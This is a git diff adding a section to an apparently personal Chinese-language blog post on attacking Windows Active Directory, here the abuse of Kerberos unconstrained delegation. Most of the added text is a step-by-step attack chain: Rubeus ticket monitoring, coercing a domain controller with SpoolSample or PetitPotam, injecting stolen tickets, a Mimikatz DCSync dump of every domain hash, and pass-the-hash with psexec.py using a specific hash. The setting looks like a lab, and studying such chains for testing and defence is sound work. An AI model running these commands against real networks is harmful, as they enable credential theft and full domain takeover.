@@ -105,3 +105,58 @@ proxychains crackmapexec smb 172.22.1.2 -u administrator -H 10cf89a850fb1cdbe6bb
 总之就是让目标机器向恶意服务器通过 smb  协议通信，通信前会有 NTLM 认证。
 
 ![img](D:\tools_D\blog\blog\src\content\posts\post5-windows\QQ_1768381517515-17683879035071.png)
+
+### 3. 一些配置缺陷
+
+#### 1. 非约束性委派
+
+- 为了解决以下问题，用户 A 访问 Web 服务器 B，B 需要以 A 的身份去访问数据库 C。它允许某台机器，或者服务账号在代表用户访问其他服务时，拥有用户完全模拟权限。
+
+##### 正常流程
+
+- 用户 A 向服务器 B (配置了非约束性委派) 发起 Kerberos 认证请求。
+- KDC (域控) 检测到服务器 B 具有非约束性委派权限。KDC 会将用户的 TGT 放入服务票据 Service Ticket 中，一并发给服务器 B 。
+- 服务器 B 会将这个 TGT 解密并存储在自己的 LSASS 内存中，用于随时模拟该用户访问一些服务。
+
+所有连接过这个服务器 B 的用户，它的 TGT 都会留在服务器 B 的内存中，因此可以让高权限机器向服务器 B 发起连接，从而拿到高权限机器账号的 TGT ，利用导出的 TGT ，打 DCSync，然后导出整个域的 Hash。
+
+- 首先上传一个 Rubeus
+
+    ```
+    # 监听
+    Rubeus.exe monitor /interval:1 /nowrap /targetuser:DC01$
+    ```
+
+     然后使用 SpoolSample 强制域控连接被控机器
+
+    ```
+    SpoolSample.exe DC01 CompromisedWeb
+    ```
+
+    或者 PetitPotam
+
+    ```
+    # 格式：python3 PetitPotam.py <服务器B的IP> <域控IP>
+    python3 PetitPotam.py 192.168.1.20 192.168.1.10
+    ```
+
+    导出 TGT ，使用 Mimikatz 或者 Rubeus  将高权限账户的 TGT 注入到当前会话，此时具备向域控请求数据同步的身份 .
+
+    ```
+    Rubeus.exe ptt /ticket:Administrator.kirbi
+    Rubeus.exe ptt /ticket: xxxxxx
+    mimikatz.exe "lsadump::dcsync /domain:lab.local /all /csv"
+    klist # 查看是否注入成功
+    ```
+
+    使用 mimikatz 
+
+    ```
+    mimikatz.exe "lsadump::dcsync /domain:xiaorang.lab /all /csv" exit
+    ```
+
+    拿到administrator 的 hash
+
+    ```none
+    proxychains python psexec.py xiaorang/Administrator@172.22.4.7 -hashes :4889f6553239ace1f7c47fa2c619c252 -codec gbk
+    ```
